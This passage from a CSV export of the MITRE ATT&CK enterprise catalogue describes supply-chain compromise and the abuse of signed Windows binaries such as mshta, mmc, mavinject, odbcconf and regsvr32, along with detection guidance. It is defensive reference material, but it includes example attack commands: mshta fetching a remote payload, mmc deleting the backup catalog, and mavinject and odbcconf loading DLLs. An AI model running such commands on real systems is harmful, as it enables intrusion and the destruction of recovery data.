* HKLM\SOFTWARE\Microsoft\Cryptography\OID
* HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\OID
* HKLM\SOFTWARE\Microsoft\Cryptography\Providers\Trust
* HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Providers\Trust

**Note:** As part of this technique, adversaries may attempt to manually edit these Registry keys (ex: Regedit) or utilize the legitimate registration process using [Regsvr32](https://attack.mitre.org/techniques/T1218/010). (Citation: SpectorOps Subverting Trust Sept 2017)

Analyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure “Hide Microsoft Entries” and “Hide Windows Entries” are both deselected. (Citation: SpectorOps Subverting Trust Sept 2017)",Windows,"File: File Modification, Module: Module Load, Windows Registry: Windows Registry Key Modification",True,T1553,"Application Control, Autoruns Analysis, Digital Certificate Validation, User Mode Signature Validation","Matt Graeber, @mattifestation, SpecterOps",,,,,,","
T1195.003,attack-pattern--39131305-9282-45e4-ac3b-591d2d4fc3ef,Supply Chain Compromise: Compromise Hardware Supply Chain,"Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",https://attack.mitre.org/techniques/T1195/003,11 March 2020,28 April 2022,enterprise-attack,1.1,Initial Access,Perform physical inspection of hardware to look for potential tampering. Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes.,"Linux, Windows, macOS",Sensor Health: Host Status,True,T1195,,,,,,,,",(Citation: TechNet Secure Boot Process),(Citation: TCG Trusted Platform Module)"
T1195.001,attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720,Supply Chain Compromise: Compromise Software Dependencies and Development Tools,"Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  

Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",https://attack.mitre.org/techniques/T1195/001,11 March 2020,28 April 2022,enterprise-attack,1.1,Initial Access,Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. ,"Linux, Windows, macOS",File: File Metadata,True,T1195,,,,,,,,"(Citation: trendmicro xcsset xcode project 2020),(Citation: OWASP Top 10)"
T1195.002,attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00,Supply Chain Compromise: Compromise Software Supply Chain,"Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.

Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)  ",https://attack.mitre.org/techniques/T1195/002,11 March 2020,28 April 2022,enterprise-attack,1.1,Initial Access,Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. ,"Linux, Windows, macOS",File: File Metadata,True,T1195,,,,,,,,"(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Secureworks NotPetya June 2017),(Citation: FireEye APT41 Aug 2019),(Citation: Avast CCleaner3 2018),(Citation: Secureworks REvil September 2019),(Citation: SolarWinds Sunburst Sunspot Update January 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Intezer Aurora Sept 2017),(Citation: Talos CCleanup 2017),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Secureworks GOLD SOUTHFIELD),(Citation: ESET Telebots June 2017),(Citation: Mandiant FIN7 Apr 2022),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Gigamon Berserk Bear October 2021),(Citation: Secureworks IRON LIBERTY July 2019),(Citation: Trustwave GoldenSpy June 2020),(Citation: OWASP Top 10)"
T1218.003,attack-pattern--4cbc6a62-9e34-4f94-8a19-5c1a11392a49,System Binary Proxy Execution: CMSTP,"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.

CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)",https://attack.mitre.org/techniques/T1218/003,23 January 2020,21 April 2023,enterprise-attack,2.1,Defense Evasion,"Use process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity.

Sysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include: (Citation: Endurant CMSTP July 2018)

* To detect loading and execution of local/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external.
* To detect [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F).",Windows,"Command: Command Execution, Network Traffic: Network Connection Creation, Process: Process Creation",True,T1218,"Anti-virus, Application control","Nik Seetharaman, Palantir; Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank",,,,,,"(Citation: Talos Cobalt Group July 2018),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: FireEye MuddyWater Mar 2018),(Citation: Morphisec Cobalt Gang Oct 2018),"
T1218.001,attack-pattern--a6937325-9321-4e2e-bb2b-3ed2d40b2a9d,System Binary Proxy Execution: Compiled HTML File,"Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)

A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)",https://attack.mitre.org/techniques/T1218/001,23 January 2020,18 October 2023,enterprise-attack,2.1,Defense Evasion,"Monitor and analyze the execution and arguments of hh.exe. (Citation: MsitPros CHM Aug 2017) Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques.

Monitor presence and use of CHM files, especially if they are not typically used within an environment.",Windows,"Command: Command Execution, File: File Creation, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation","Rahmat Nurfauzi, @infosecn1nja, PT Xynexis International",,,,,,"(Citation: Palo Alto OilRig May 2016),(Citation: Cofense Astaroth Sept 2018),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Group IB Silence Sept 2018),(Citation: Group IB Silence Aug 2019),(Citation: Lookout Dark Caracal Jan 2018),(Citation: FireEye APT41 Aug 2019),(Citation: Kaspersky Lazarus Under The Hood APR 2017),(Citation: SecureList Silence Nov 2017),"
T1218.002,attack-pattern--4ff5d6a8-c062-4c68-a778-36fc5edd564f,System Binary Proxy Execution: Control Panel,"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.

Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)

Malicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.

Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.(Citation: ESET InvisiMole June 2020)",https://attack.mitre.org/techniques/T1218/002,23 January 2020,11 March 2022,enterprise-attack,2.0,Defense Evasion,"Monitor and analyze activity related to items associated with CPL files, such as the control.exe and the <code>Control_RunDLL</code> and <code>ControlRunDLLAsUser</code> API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: <code>control.exe file.cpl</code>) before [Rundll32](https://attack.mitre.org/techniques/T1218/011) is used to call the CPL's API functions (ex: <code>rundll32.exe shell32.dll,Control_RunDLL file.cpl</code>). CPL files can be executed directly via the CPL API function with just the latter [Rundll32](https://attack.mitre.org/techniques/T1218/011) command, which may bypass detections and/or execution filters for control.exe.(Citation: TrendMicro CPL Malware Jan 2014)

Inventory Control Panel items to locate unregistered and potentially malicious files present on systems:

* Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel\NameSpace</code> and <code>HKEY_CLASSES_ROOT\CLSID\{GUID}</code>. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel. (Citation: Microsoft Implementing CPL)
* CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the <code>CPLs</code> and <code>Extended Properties</code> Registry keys of <code>HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Control Panel</code>. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically (<code> WinExec(""c:\windows\system32\control.exe {Canonical_Name}"", SW_NORMAL);</code>) or from a command line (<code>control.exe /name {Canonical_Name}</code>).(Citation: Microsoft Implementing CPL)
* Some Control Panel items are extensible via Shell extensions registered in <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Controls Folder\{name}\Shellex\PropertySheetHandlers</code> where {name} is the predefined name of the system item.(Citation: Microsoft Implementing CPL)

Analyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques.(Citation: TrendMicro CPL Malware Jan 2014)",Windows,"Command: Command Execution, File: File Creation, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1218,Application control,ESET,"Administrator, SYSTEM, User",,,,,"(Citation: ESET InvisiMole June 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Palo Alto Reaver Nov 2017),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: Corio 2008),(Citation: NSA MS AppLocker),(Citation: Microsoft Windows Defender Application Control),(Citation: TechNet Applocker vs SRP)"
T1218.004,attack-pattern--2cd950a6-16c4-404a-aa01-044322395107,System Binary Proxy Execution: InstallUtil,"Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>.

InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)",https://attack.mitre.org/techniques/T1218/004,23 January 2020,11 March 2022,enterprise-attack,2.0,Defense Evasion,Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.,Windows,"Command: Command Execution, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation","Casey Smith; Travis Smith, Tripwire",User,,,,,"(Citation: Cybereason Chaes Nov 2020),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Unit 42 WhisperGate January 2022),"
T1218.014,attack-pattern--ffbcfdb0-de22-4106-9ed3-fc23c8a01407,System Binary Proxy Execution: MMC,"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.(Citation: win_msc_files_overview)

For example, <code>mmc C:\Users\foo\admintools.msc /a</code> will open a custom, saved console msc file in author mode.(Citation: win_mmc) Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. 

Adversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation: phobos_virustotal)

Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation: win_clsid_key) Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey.(Citation: mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\path\to\test.msc</code>.(Citation: abusing_com_reg)",https://attack.mitre.org/techniques/T1218/014,28 September 2021,20 May 2022,enterprise-attack,2.0,Defense Evasion,"Monitor processes and command-line parameters for suspicious or malicious use of MMC. Since MMC is a signed Windows binary, verify use of MMC is legitimate and not malicious. 

Monitor for creation and use of .msc files. MMC may legitimately be used to call Microsoft-created .msc files, such as <code>services.msc</code> or <code>eventvwr.msc</code>. Invoking non-Microsoft .msc files may be an indicator of malicious activity. ",Windows,"Command: Command Execution, File: File Creation, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation",Wes Hurd,,,,,,","
T1218.013,attack-pattern--1bae753e-8e52-4055-a66d-2ead90303ca9,System Binary Proxy Execution: Mavinject,"Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject)

Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. <code>C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation: Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. 

In addition to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.(Citation: Mavinject Functionality Deconstructed)",https://attack.mitre.org/techniques/T1218/013,22 September 2021,19 April 2022,enterprise-attack,2.0,Defense Evasion,"Monitor the execution and arguments of mavinject.exe. Compare recent invocations of mavinject.exe with prior history of known good arguments and injected DLLs to determine anomalous and potentially adversarial activity.

Adversaries may rename abusable binaries to evade detections, but the argument <code>INJECTRUNNING</code> is required for mavinject.exe to perform [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001) and may therefore be monitored to alert malicious activity.",Windows,"Command: Command Execution, Process: Process Creation",True,T1218,,,,,,,,","
T1218.005,attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade,System Binary Proxy Execution: Mshta,"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",https://attack.mitre.org/techniques/T1218/005,23 January 2020,11 March 2022,enterprise-attack,2.0,Defense Evasion,"Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.

Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious",Windows,"Command: Command Execution, File: File Creation, Network Traffic: Network Connection Creation, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation","@ionstorm; Ricardo Dias; Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank",User,,,,,"(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: FireEye Metamorfo Apr 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Securelist MuddyWater Oct 2018),(Citation: DFIR Conti Bazar Nov 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Symantec Shuckworm January 2022),(Citation: Qualys LolZarus),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: TrendMicro Confucius APT Feb 2018),(Citation: FireEye FIN7 April 2017),(Citation: Cisco Operation Layover September 2021),(Citation: Cybereason Oceanlotus May 2017),(Citation: TrendMicro EarthLusca 2022),(Citation: Rewterz Sidewinder APT April 2020),(Citation: CISA AA20-301A Kimsuky),(Citation: Github Koadic),(Citation: KISA Operation Muzabi),(Citation: Cylance Dust Storm),(Citation: Unit42 Xbash Sept 2018),(Citation: ESET T3 Threat Report 2021),(Citation: Unit 42 TA551 Jan 2021),(Citation: EST Kimsuky April 2019),(Citation: fsecure NanHaiShu July 2016),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Cofense RevengeRAT Feb 2019),(Citation: Lazarus APT January 2022),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Microsoft WDAC)"
T1218.007,attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336,System Binary Proxy Execution: Msiexec,"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.

Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",https://attack.mitre.org/techniques/T1218/007,24 January 2020,19 April 2022,enterprise-attack,2.0,Defense Evasion,Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.,Windows,"Command: Command Execution, Module: Module Load, Network Traffic: Network Connection Creation, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation","Alexandros Pappas; Ziv Kaspersky, Cymptom",,,,,,"(Citation: Cybereason TA505 April 2019),(Citation: Sophos Ragnar May 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: Deep Instinct TA505 Apr 2019),(Citation: CISA AppleJeus Feb 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Rancor Unit42 June 2018),(Citation: Crowdstrike Qakbot October 2020),(Citation: Cybereason Clop Dec 2020),(Citation: Kaspersky Duqu 2.0),(Citation: Unit42 Molerat Mar 2020),(Citation: Juniper IcedID June 2020),(Citation: 360 Machete Sep 2020),(Citation: Mandiant APT41),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Profero APT27 December 2020),(Citation: Korean FSI TA505 2020),(Citation: Fortinet Metamorfo Feb 2020),(Citation: ESET LoudMiner June 2019),(Citation: Trend Micro TA505 June 2019),(Citation: Sophos Maze VM September 2020),(Citation: Microsoft AlwaysInstallElevated 2018)"
T1218.008,attack-pattern--6e3bd510-6b33-41a4-af80-2d80f3ee0071,System Binary Proxy Execution: Odbcconf,"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.

Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR ""C:\Users\Public\file.dll""&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) 
",https://attack.mitre.org/techniques/T1218/008,24 January 2020,11 March 2022,enterprise-attack,2.0,Defense Evasion,Use process monitoring to monitor the execution and arguments of odbcconf.exe. Compare recent invocations of odbcconf.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of odbcconf.exe may also be useful in determining the origin and purpose of the DLL being loaded.,Windows,"Command: Command Execution, Module: Module Load, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation",,User,,,,,"(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Cybereason Bumblebee August 2022),"
T1218.009,attack-pattern--c48a67ee-b657-45c1-91bf-6cdbe27205f8,System Binary Proxy Execution: Regsvcs/Regasm,"Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)",https://attack.mitre.org/techniques/T1218/009,23 January 2020,11 March 2022,enterprise-attack,2.0,Defense Evasion,Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.,Windows,"Command: Command Execution, Process: Process Creation",True,T1218,"Application control, Digital Certificate Validation",Casey Smith,"Administrator, User",,,,,"(Citation: SentinelLabs Agent Tesla Aug 2020),"
T1218.010,attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab,System Binary Proxy Execution: Regsvr32,"Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)

Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a ""Squiblydoo"" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",https://attack.mitre.org/techniques/T1218/010,23 January 2020,21 April 2023,enterprise-attack,2.1,Defense Evasion,Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016),Windows,"Command: Command Execution, Module: Module Load, Network Traffic: Network Connection Creation, Process: Process Creation",True,T1218,"Anti-virus, Application control, Digital Certificate Validation",Casey Smith,,,,,,"(Citation: JoeSecurity Egregor 2020),(Citation: Sophos Ragnar May 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Cyberint Qakbot May 2021),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Fidelis INOCNATION),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: RSA Shell Crew),(Citation: NCC Group Black Basta June 2022),(Citation: Cybereason Astaroth Feb 2019),(Citation: Trend Micro Black Basta October 2022),(Citation: Unit 42 Valak July 2020),(Citation: ESET EvilNum July 2020),(Citation: Lab52 WIRTE Apr 2019),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: ATT QakBot April 2021),(Citation: ESET OceanLotus Mar 2019),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Talos Cobalt Group July 2018),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: Red Canary Dridex Threat Report 2021),(Citation: ThreatGeek Derusbi Converge),(Citation: FireEye APT32 May 2017),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Cybereason Valak May 2020),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Github Koadic),(Citation: 